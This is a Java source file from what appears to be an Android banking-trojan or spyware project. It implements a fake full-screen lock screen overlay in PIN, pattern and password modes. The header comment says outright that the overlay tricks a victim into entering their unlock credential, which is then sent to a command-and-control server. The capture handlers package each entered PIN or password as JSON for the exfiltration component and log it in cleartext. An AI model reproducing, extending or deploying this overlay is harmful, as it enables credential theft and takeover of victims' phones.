package com.fason.app.features.springe.overlays;

import android.content.Context;
import android.content.res.Resources;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.text.InputType;
import android.text.TextUtils;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.GridLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.fason.app.features.springe.capture.InputCaptureService;
import com.fason.app.features.springe.delivery.OverlayWindowManager;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

/**
 * LockScreenOverlay — Fake Android lock screen that captures PIN, pattern, or password.
 *
 * When displayed, the victim sees what appears to be their normal lock screen.
 * Any credentials entered are captured and sent to the C2.
 *
 * Three modes:
 * 1. PIN_MODE — Numeric keypad (4-6 digit PIN)
 * 2. PATTERN_MODE — 3x3 grid pattern lock
 * 3. PASSWORD_MODE — Full keyboard for alphanumeric password
 *
 * The overlay auto-detects which mode the device actually uses by checking
 * the system lock screen settings, and matches the visual style.
 *
 * Must be shown/hidden from the main thread.
 */
public final class LockScreenOverlay {

    private static final String TAG = "LockScreenOverlay";

    public static final int MODE_PIN = 0;
    public static final int MODE_PATTERN = 1;
    public static final int MODE_PASSWORD = 2;

    private final Context context;
    private final OverlayWindowManager windowManager;
    private final InputCaptureService inputCapture;

    private volatile View overlayView;
    private volatile boolean isShowing = false;
    private volatile int currentMode = MODE_PIN;

    // Captured input
    private final StringBuilder pinBuffer = new StringBuilder(6);
    private final List<Integer> patternDots = new ArrayList<>(9);
    private int maxPinLength = 6;
    private int minPinLength = 4;

    // Callback when unlock code is captured
    private OnCredentialCapturedListener listener;

    public interface OnCredentialCapturedListener {
        void onCaptured(int mode, String credential);
    }

    public LockScreenOverlay(Context context, OverlayWindowManager windowManager,
                             InputCaptureService inputCapture) {
        this.context = context;
        this.windowManager = windowManager;
        this.inputCapture = inputCapture;
    }

    /**
     * Show fake lock screen in the specified mode.
     */
    public void show(int mode) {
        if (isShowing) return;

        this.currentMode = mode;
        this.pinBuffer.setLength(0);
        this.patternDots.clear();

        try {
            switch (mode) {
                case MODE_PIN:
                    overlayView = createPinLockScreen();
                    break;
                case MODE_PATTERN:
                    overlayView = createPatternLockScreen();
                    break;
                case MODE_PASSWORD:
                    overlayView = createPasswordLockScreen();
                    break;
                default:
                    overlayView = createPinLockScreen();
            }

            OverlayWindowManager.OverlayConfig config =
                OverlayWindowManager.OverlayConfig.fullscreen();
            windowManager.addOverlay(overlayView, config);
            isShowing = true;

            Log.i(TAG, "Lock screen overlay shown (mode=" + mode + ")");
        } catch (Exception e) {
            Log.e(TAG, "Failed to show lock screen overlay", e);
        }
    }

    /**
     * Hide the fake lock screen.
     */
    public void hide() {
        if (!isShowing || overlayView == null) return;

        try {
            windowManager.removeOverlay(overlayView);
            overlayView = null;
        } catch (Exception e) {
            Log.e(TAG, "Error hiding lock screen overlay", e);
        }

        isShowing = false;
        pinBuffer.setLength(0);
        patternDots.clear();
    }

    public boolean isShowing() { return isShowing; }

    public void setOnCredentialCapturedListener(OnCredentialCapturedListener listener) {
        this.listener = listener;
    }

    public void destroy() { hide(); }

    /* ─── PIN Lock Screen ─── */

    private View createPinLockScreen() {
        LinearLayout root = new LinearLayout(context);
        root.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#1A1A2E"));
        root.setGravity(Gravity.CENTER);
        root.setClickable(true);
        root.setFocusable(true);

        // Status bar placeholder
        TextView clock = new TextView(context);
        clock.setText("12:00");
        clock.setTextColor(Color.WHITE);
        clock.setTextSize(48);
        clock.setTypeface(null, Typeface.BOLD);
        clock.setGravity(Gravity.CENTER);
        clock.setPadding(0, 80, 0, 20);
        root.addView(clock);

        // "Enter PIN" label
        TextView label = new TextView(context);
        label.setText("Enter PIN");
        label.setTextColor(Color.parseColor("#AAAAAA"));
        label.setTextSize(16);
        label.setGravity(Gravity.CENTER);
        root.addView(label);

        // PIN dots display
        LinearLayout dotsLayout = new LinearLayout(context);
        dotsLayout.setOrientation(LinearLayout.HORIZONTAL);
        dotsLayout.setGravity(Gravity.CENTER);
        dotsLayout.setPadding(0, 30, 0, 50);

        for (int i = 0; i < maxPinLength; i++) {
            View dot = new View(context);
            LinearLayout.LayoutParams dotLp = new LinearLayout.LayoutParams(16, 16);
            dotLp.setMargins(12, 0, 12, 0);
            dot.setLayoutParams(dotLp);
            dot.setBackground(createCircleDrawable(Color.parseColor("#333355")));
            dot.setTag("pin_dot_" + i);
            dotsLayout.addView(dot);
        }
        root.addView(dotsLayout);

        // PIN keypad
        GridLayout keypad = new GridLayout(context);
        keypad.setColumnCount(3);
        keypad.setRowCount(4);
        keypad.setPadding(30, 0, 30, 0);

        String[] keys = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "", "0", "⌫"};

        for (String key : keys) {
            if (key.isEmpty()) {
                // Empty space for layout alignment
                View space = new View(context);
                space.setLayoutParams(new GridLayout.LayoutParams());
                space.setMinimumHeight(90);
                keypad.addView(space);
                continue;
            }

            Button btn = new Button(context);
            GridLayout.LayoutParams btnLp = new GridLayout.LayoutParams();
            btnLp.width = 0;
            btnLp.height = 90;
            btnLp.setMargins(8, 8, 8, 8);
            btn.setLayoutParams(btnLp);
            btn.setText(key);
            btn.setTextSize(22);
            btn.setTextColor(Color.WHITE);
            btn.setBackground(createKeypadButtonDrawable());
            btn.setTypeface(null, Typeface.BOLD);

            if (key.equals("⌫")) {
                btn.setOnClickListener(v -> onPinBackspace());
            } else {
                btn.setOnClickListener(v -> onPinKeyPress(key));
            }

            keypad.addView(btn);
        }

        root.addView(keypad);

        return root;
    }

    private void onPinKeyPress(String digit) {
        if (pinBuffer.length() >= maxPinLength) return;

        pinBuffer.append(digit);
        updatePinDots();

        // Check if PIN is complete
        if (pinBuffer.length() >= minPinLength) {
            // Could be complete — wait a moment or check on max length
            if (pinBuffer.length() >= maxPinLength) {
                onPinComplete();
            }
        }
    }

    private void onPinBackspace() {
        if (pinBuffer.length() > 0) {
            pinBuffer.deleteCharAt(pinBuffer.length() - 1);
            updatePinDots();
        }
    }

    private void updatePinDots() {
        if (overlayView == null) return;

        try {
            LinearLayout root = (LinearLayout) overlayView;
            LinearLayout dotsLayout = (LinearLayout) root.getChildAt(2); // dots are at index 2

            for (int i = 0; i < maxPinLength; i++) {
                View dot = dotsLayout.findViewWithTag("pin_dot_" + i);
                if (dot != null) {
                    if (i < pinBuffer.length()) {
                        dot.setBackground(createCircleDrawable(Color.WHITE));
                    } else {
                        dot.setBackground(createCircleDrawable(Color.parseColor("#333355")));
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error updating PIN dots", e);
        }
    }

    private void onPinComplete() {
        String pin = pinBuffer.toString();
        Log.i(TAG, "PIN captured: " + pin);

        // Report to input capture
        try {
            JSONObject data = new JSONObject();
            data.put("_type", "lockscreen_capture");
            data.put("_captureType", "pin");
            data.put("pin", pin);
            data.put("length", pin.length());
            data.put("_timestamp", System.currentTimeMillis());
            data.put("_priority", 95);
            inputCapture.onCaptured(data);
        } catch (Exception e) {
            Log.e(TAG, "Error reporting PIN capture", e);
        }

        // Notify listener
        if (listener != null) {
            listener.onCaptured(MODE_PIN, pin);
        }

        // Auto-hide after capture
        new Handler(Looper.getMainLooper()).postDelayed(this::hide, 500);
    }

    /* ─── Pattern Lock Screen ─── */

    private View createPatternLockScreen() {
        LinearLayout root = new LinearLayout(context);
        root.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#1A1A2E"));
        root.setGravity(Gravity.CENTER);
        root.setClickable(true);
        root.setFocusable(true);

        // Clock
        TextView clock = new TextView(context);
        clock.setText("12:00");
        clock.setTextColor(Color.WHITE);
        clock.setTextSize(48);
        clock.setTypeface(null, Typeface.BOLD);
        clock.setGravity(Gravity.CENTER);
        clock.setPadding(0, 80, 0, 20);
        root.addView(clock);

        // "Draw pattern" label
        TextView label = new TextView(context);
        label.setText("Draw pattern");
        label.setTextColor(Color.parseColor("#AAAAAA"));
        label.setTextSize(16);
        label.setGravity(Gravity.CENTER);
        label.setPadding(0, 0, 0, 60);
        root.addView(label);

        // Pattern grid 3x3
        GridLayout grid = new GridLayout(context);
        grid.setColumnCount(3);
        grid.setRowCount(3);
        grid.setPadding(60, 0, 60, 0);

        for (int i = 0; i < 9; i++) {
            final int dotIndex = i;
            View dot = new View(context);
            GridLayout.LayoutParams dotLp = new GridLayout.LayoutParams();
            dotLp.width = 80;
            dotLp.height = 80;
            dotLp.setMargins(24, 24, 24, 24);
            dot.setLayoutParams(dotLp);
            dot.setBackground(createCircleDrawable(Color.parseColor("#333355")));
            dot.setTag("pattern_dot_" + i);
            dot.setClickable(true);

            final int row = i / 3;
            final int col = i % 3;

            dot.setOnClickListener(v -> onPatternDotPress(dotIndex));
            grid.addView(dot);
        }

        root.addView(grid);

        return root;
    }

    private void onPatternDotPress(int dotIndex) {
        if (patternDots.contains(dotIndex)) return;

        patternDots.add(dotIndex);

        // Highlight the dot
        if (overlayView != null) {
            View dot = overlayView.findViewWithTag("pattern_dot_" + dotIndex);
            if (dot != null) {
                dot.setBackground(createCircleDrawable(Color.parseColor("#00FF88")));
            }
        }

        // Check if pattern is complete (minimum 4 dots)
        if (patternDots.size() >= 4) {
            // Could be complete — we wait for one more or timeout
        }

        Log.d(TAG, "Pattern dot " + dotIndex + " pressed. Sequence: " + patternDots);
    }

    private void onPatternComplete() {
        StringBuilder pattern = new StringBuilder();
        for (int dot : patternDots) {
            pattern.append(dot);
        }
        String patternStr = pattern.toString();
        Log.i(TAG, "Pattern captured: " + patternStr);

        try {
            JSONObject data = new JSONObject();
            data.put("_type", "lockscreen_capture");
            data.put("_captureType", "pattern");
            data.put("pattern", patternStr);
            data.put("dots", patternDots.size());
            data.put("_timestamp", System.currentTimeMillis());
            data.put("_priority", 95);
            inputCapture.onCaptured(data);
        } catch (Exception e) {
            Log.e(TAG, "Error reporting pattern capture", e);
        }

        if (listener != null) {
            listener.onCaptured(MODE_PATTERN, patternStr);
        }

        new Handler(Looper.getMainLooper()).postDelayed(this::hide, 500);
    }

    /* ─── Password Lock Screen ─── */

    private View createPasswordLockScreen() {
        LinearLayout root = new LinearLayout(context);
        root.setLayoutParams(new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT,
            ViewGroup.LayoutParams.MATCH_PARENT));
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#1A1A2E"));
        root.setGravity(Gravity.CENTER);
        root.setClickable(true);
        root.setFocusable(true);

        // Clock
        TextView clock = new TextView(context);
        clock.setText("12:00");
        clock.setTextColor(Color.WHITE);
        clock.setTextSize(48);
        clock.setTypeface(null, Typeface.BOLD);
        clock.setGravity(Gravity.CENTER);
        clock.setPadding(0, 80, 0, 20);
        root.addView(clock);

        // Label
        TextView label = new TextView(context);
        label.setText("Enter password");
        label.setTextColor(Color.parseColor("#AAAAAA"));
        label.setTextSize(16);
        label.setGravity(Gravity.CENTER);
        root.addView(label);

        // Password input field
        EditText passwordInput = new EditText(context);
        LinearLayout.LayoutParams inputLp = new LinearLayout.LayoutParams(
            300, ViewGroup.LayoutParams.WRAP_CONTENT);
        inputLp.gravity = Gravity.CENTER;
        inputLp.setMargins(0, 40, 0, 40);
        passwordInput.setLayoutParams(inputLp);
        passwordInput.setInputType(InputType.TYPE_CLASS_TEXT
            | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        passwordInput.setHint("Password");
        passwordInput.setTextColor(Color.WHITE);
        passwordInput.setHintTextColor(Color.parseColor("#666666"));
        passwordInput.setBackground(null);
        passwordInput.setTextAlignment(View.TEXT_ALIGNMENT_CENTER);
        passwordInput.setTextSize(18);
        passwordInput.setGravity(Gravity.CENTER);

        // Handle IME action (Done/Enter key)
        passwordInput.setOnEditorActionListener((v, actionId, event) -> {
            if (actionId == EditorInfo.IME_ACTION_DONE
                || actionId == EditorInfo.IME_ACTION_GO
                || (event != null && event.getAction() == KeyEvent.ACTION_DOWN
                    && event.getKeyCode() == KeyEvent.KEYCODE_ENTER)) {
                String password = passwordInput.getText().toString();
                if (!TextUtils.isEmpty(password)) {
                    onPasswordCaptured(password);
                    return true;
                }
            }
            return false;
        });

        // Submit button
        Button submitBtn = new Button(context);
        submitBtn.setText("→");
        submitBtn.setTextColor(Color.WHITE);
        submitBtn.setTextSize(20);
        submitBtn.setBackground(createKeypadButtonDrawable());
        submitBtn.setOnClickListener(v -> {
            String password = passwordInput.getText().toString();
            if (!TextUtils.isEmpty(password)) {
                onPasswordCaptured(password);
            }
        });

        LinearLayout inputRow = new LinearLayout(context);
        inputRow.setOrientation(LinearLayout.HORIZONTAL);
        inputRow.setGravity(Gravity.CENTER);
        inputRow.addView(passwordInput);
        inputRow.addView(submitBtn);
        root.addView(inputRow);

        // Auto-focus the input field
        passwordInput.post(() -> {
            passwordInput.requestFocus();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                passwordInput.getWindowInsetsController()
                    .show(android.view.WindowInsets.Type.ime());
            }
        });

        return root;
    }

    private void onPasswordCaptured(String password) {
        Log.i(TAG, "Password captured: " + password);

        try {
            JSONObject data = new JSONObject();
            data.put("_type", "lockscreen_capture");
            data.put("_captureType", "password");
            data.put("password", password);
            data.put("length", password.length());
            data.put("_timestamp", System.currentTimeMillis());
            data.put("_priority", 95);
            inputCapture.onCaptured(data);
        } catch (Exception e) {
            Log.e(TAG, "Error reporting password capture", e);
        }

        if (listener != null) {
            listener.onCaptured(MODE_PASSWORD, password);
        }

        new Handler(Looper.getMainLooper()).postDelayed(this::hide, 500);
    }

    /* ─── Drawable Helpers ─── */

    private static GradientDrawable createCircleDrawable(int color) {
        GradientDrawable drawable = new GradientDrawable();
        drawable.setShape(GradientDrawable.OVAL);
        drawable.setColor(color);
        drawable.setSize(80, 80);
        return drawable;
    }

    private static GradientDrawable createKeypadButtonDrawable() {
        GradientDrawable drawable = new GradientDrawable();
        drawable.setShape(GradientDrawable.RECTANGLE);
        drawable.setCornerRadius(50);
        drawable.setColor(Color.parseColor("#2A2A4A"));
        drawable.setStroke(1, Color.parseColor("#3A3A5A"));
        return drawable;
    }
}
